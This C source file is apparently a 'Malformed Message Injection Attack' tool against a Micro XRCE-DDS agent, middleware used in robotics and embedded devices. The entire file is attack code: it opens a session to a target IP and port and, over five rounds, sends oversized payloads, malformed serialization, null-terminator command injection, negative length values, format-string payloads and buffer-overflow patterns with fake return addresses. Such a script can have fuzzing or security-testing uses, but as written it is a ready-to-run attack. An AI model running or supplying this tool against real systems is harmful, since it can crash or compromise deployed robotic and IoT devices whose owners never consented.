// Compile: gcc attack_malformed_inject.c -o malformed_inject -lmicroxrcedds_client -lmicrocdr
#include <uxr/client/client.h>
#include <ucdr/microcdr.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define STREAM_HISTORY  8
#define BUFFER_SIZE     UXR_CONFIG_UDP_TRANSPORT_MTU * STREAM_HISTORY

void send_oversized_data(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending oversized data payload...\n");
    
    // Create buffer much larger than expected
    uint8_t huge_buffer[65536];
    memset(huge_buffer, 0x41, sizeof(huge_buffer)); // Fill with 'A'
    
    ucdrBuffer ub;
    ucdr_init_buffer(&ub, huge_buffer, sizeof(huge_buffer));
    
    // Try to serialize massive string
    char* huge_string = (char*)malloc(65000);
    memset(huge_string, 'X', 65000);
    huge_string[64999] = '\0';
    
    ucdr_serialize_string(&ub, huge_string);
    
    uxr_buffer_request_data(session, stream, datawriter,
                           ucdr_buffer_get_buffer_pointer(&ub),
                           ucdr_buffer_get_buffer_length(&ub));
    
    free(huge_string);
    printf("[+] Oversized data sent\n");
}

void send_malformed_serialization(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending malformed serialization...\n");
    
    uint8_t malformed[256];
    ucdrBuffer ub;
    ucdr_init_buffer(&ub, malformed, sizeof(malformed));
    
    // Incorrect type序列化
    ucdr_serialize_uint32_t(&ub, 0xDEADBEEF);
    ucdr_serialize_uint64_t(&ub, 0xCAFEBABEDEADBEEF);
    // Serialize string length but no data
    ucdr_serialize_uint32_t(&ub, 99999);
    
    uxr_buffer_request_data(session, stream, datawriter, malformed, ucdr_buffer_length(&ub));
    
    printf("[+] Malformed data sent\n");
}

void send_null_terminators(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending null terminator injection...\n");
    
    uint8_t null_buffer[128];
    ucdrBuffer ub;
    ucdr_init_buffer(&ub, null_buffer, sizeof(null_buffer));
    
    char injection[] = "Valid\x00HIDDEN_COMMAND\x00MORE_DATA";
    ucdr_serialize_array_char(&ub, injection, sizeof(injection));
    
    uxr_buffer_request_data(session, stream, datawriter, null_buffer, ucdr_buffer_length(&ub));
    
    printf("[+] Null terminator injection sent\n");
}

void send_negative_sizes(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending negative size values...\n");
    
    uint8_t neg_buffer[128];
    ucdrBuffer ub;
    ucdr_init_buffer(&ub, neg_buffer, sizeof(neg_buffer));
    
    // Serialize negative length (interpreted as huge positive)
    ucdr_serialize_int32_t(&ub, -1);
    ucdr_serialize_int32_t(&ub, -2147483648);
    
    uxr_buffer_request_data(session, stream, datawriter, neg_buffer, ucdr_buffer_length(&ub));
    
    printf("[+] Negative size values sent\n");
}

void send_format_string_attack(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending format string attack payload...\n");
    
    uint8_t fmt_buffer[256];
    ucdrBuffer ub;
    ucdr_init_buffer(&ub, fmt_buffer, sizeof(fmt_buffer));
    
    char format_string[] = "%x %x %x %x %x %x %x %x %n";
    ucdr_serialize_string(&ub, format_string);
    
    uxr_buffer_request_data(session, stream, datawriter, fmt_buffer, ucdr_buffer_length(&ub));
    
    printf("[+] Format string payload sent\n");
}

void send_buffer_overflow_attempt(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Attempting buffer overflow...\n");
    
    // Create payload with shellcode pattern
    uint8_t overflow_buffer[512];
    ucdrBuffer ub;
    ucdr_init_buffer(&ub, overflow_buffer, sizeof(overflow_buffer));
    
    // Pattern to detect overflow (De Bruijn sequence style)
    char pattern[300];
    for (int i = 0; i < sizeof(pattern) - 1; i++) {
        pattern[i] = 'A' + (i % 26);
    }
    pattern[sizeof(pattern) - 1] = '\0';
    
    ucdr_serialize_string(&ub, pattern);
    
    // Add potential return address overwrite
    ucdr_serialize_uint32_t(&ub, 0x41414141);
    ucdr_serialize_uint32_t(&ub, 0x42424242);
    
    uxr_buffer_request_data(session, stream, datawriter, overflow_buffer, 
                           ucdr_buffer_length(&ub));
    
    printf("[+] Overflow attempt sent\n");
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Malformed Message Injection Attack ===\n");
    printf("Target: %s:%s\n\n", ip, port);
    
    // Initialize transport
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port)) {
        printf("[-] Failed to init transport\n");
        return 1;
    }
    
    // Create session
    uxrSession session;
    uxr_init_session(&session, &transport.comm, 0xBADC0DE);
    
    if (!uxr_create_session(&session)) {
        printf("[-] Failed to create session\n");
        return 1;
    }
    
    printf("[+] Session created\n");
    
    // Create streams
    uint8_t output_buffer[BUFFER_SIZE];
    uxrStreamId reliable_out = uxr_create_output_reliable_stream(&session, output_buffer,
                                                                  BUFFER_SIZE, STREAM_HISTORY);
    
    uint8_t input_buffer[BUFFER_SIZE];
    uxr_create_input_reliable_stream(&session, input_buffer, BUFFER_SIZE, STREAM_HISTORY);
    
    // Create entities
    uxrObjectId participant_id = uxr_object_id(0x01, UXR_PARTICIPANT_ID);
    const char* participant_xml = "<dds><participant><rtps><name>malformed_attacker</name></rtps></participant></dds>";
    uxr_buffer_create_participant_xml(&session, reliable_out, participant_id, 0, participant_xml, UXR_REPLACE);
    
    uxrObjectId topic_id = uxr_object_id(0x01, UXR_TOPIC_ID);
    const char* topic_xml = "<dds><topic><name>MalformedTopic</name><dataType>string</dataType></topic></dds>";
    uxr_buffer_create_topic_xml(&session, reliable_out, topic_id, participant_id, topic_xml, UXR_REPLACE);
    
    uxrObjectId publisher_id = uxr_object_id(0x01, UXR_PUBLISHER_ID);
    uxr_buffer_create_publisher_xml(&session, reliable_out, publisher_id, participant_id, "", UXR_REPLACE);
    
    uxrObjectId datawriter_id = uxr_object_id(0x01, UXR_DATAWRITER_ID);
    uxrQoS_t qos = {
        .durability = UXR_DURABILITY_VOLATILE,
        .reliability = UXR_RELIABILITY_BEST_EFFORT,
        .history = UXR_HISTORY_KEEP_LAST,
        .depth = 1
    };
    uxr_buffer_create_datawriter_xml(&session, reliable_out, datawriter_id, publisher_id, 
                                     topic_id, "", qos, UXR_REPLACE);
    
    printf("[*] Waiting for entity creation...\n");
    uxr_run_session_until_confirm_delivery(&session, 2000);
    
    // Launch various malformed attacks
    printf("\n[*] Starting malformed message attacks...\n\n");
    
    for (int round = 0; round < 5; round++) {
        printf("--- Round %d ---\n", round + 1);
        
        send_oversized_data(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        send_malformed_serialization(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        send_null_terminators(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        send_negative_sizes(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        send_format_string_attack(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        send_buffer_overflow_attempt(&session, reliable_out, datawriter_id);
        usleep(500000);
        
        uxr_run_session_time(&session, 1000);
    }
    
    printf("\n[*] Attack completed\n");
    
    // Cleanup
    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    
    return 0;
}